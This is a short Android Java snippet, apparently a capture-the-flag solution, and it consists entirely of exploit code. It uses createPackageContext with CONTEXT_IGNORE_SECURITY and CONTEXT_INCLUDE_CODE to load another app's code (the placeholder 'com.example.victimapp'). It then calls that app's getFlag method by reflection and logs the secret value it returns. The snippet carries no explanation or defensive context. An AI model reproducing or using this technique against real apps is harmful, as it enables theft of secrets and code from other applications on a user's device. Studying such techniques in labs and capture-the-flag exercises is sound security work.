
Context appContext = null;
try{
    appContext = createPackageContext("com.example.victimapp", Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE);
} catch(PackageManager.NameNotFoundException e){
    Log.i(TAG, "com.example.victimapp is not installed");
}
if(appContext == null){
    return;
}
ClassLoader classLoader = appContext.getClassLoader();
String flag = "";
try {
    flag = (String) classLoader.loadClass("com.example.victimapp.MainActivity").getDeclaredMethod("getFlag").invoke(null);
} catch (Exception e){
    Log.i(TAG, String.valueOf(e));
}

Log.i(TAG, flag);
